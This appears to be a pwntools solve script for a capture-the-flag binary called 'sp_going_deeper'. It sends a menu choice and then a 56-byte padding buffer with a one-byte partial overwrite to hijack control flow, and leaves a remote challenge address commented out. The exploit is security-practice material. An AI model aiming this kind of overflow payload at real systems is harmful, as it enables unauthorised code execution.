#!/usr/bin/env python3

from pwn import *

exe = ELF("./sp_going_deeper_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe



p = process()
#p = remote('83.136.250.158',34502)
#gdb.attach(p,gdbscript='''
#           b*0x0000000000400b46
#           ''')
input()
payload = b'a'*56 + b'\x12'
p.sendline(b'2')
p.send(payload)

p.interactive()
